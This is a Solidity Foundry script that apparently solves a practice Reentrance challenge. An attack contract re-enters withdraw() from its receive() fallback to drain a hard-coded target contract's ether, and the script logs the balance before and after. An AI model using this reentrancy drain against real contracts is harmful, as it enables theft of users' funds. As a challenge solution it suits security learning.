// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackContract {
    Reentrance reentrance;
    address owner;

    constructor(Reentrance _reentrance) public payable {
        reentrance = _reentrance;
        owner = msg.sender;
    }

    function attack() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        if (msg.sender != owner && address(reentrance).balance >= 0) {
            reentrance.withdraw(0.001 ether);
        }
    }
}

contract ReEntrancySolution is Script {
    Reentrance public reentranceInstance = Reentrance(0x24D298E950e6ddcAf5083260FF75ea8B4975Dd9b);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Contract Balance before : ", address(reentranceInstance).balance);

        AttackContract attackContract = new AttackContract{ value: 0.001 ether }(reentranceInstance);

        attackContract.attack();

        console.log("Contract Balance after : ", address(reentranceInstance).balance);

        vm.stopBroadcast();
    }
}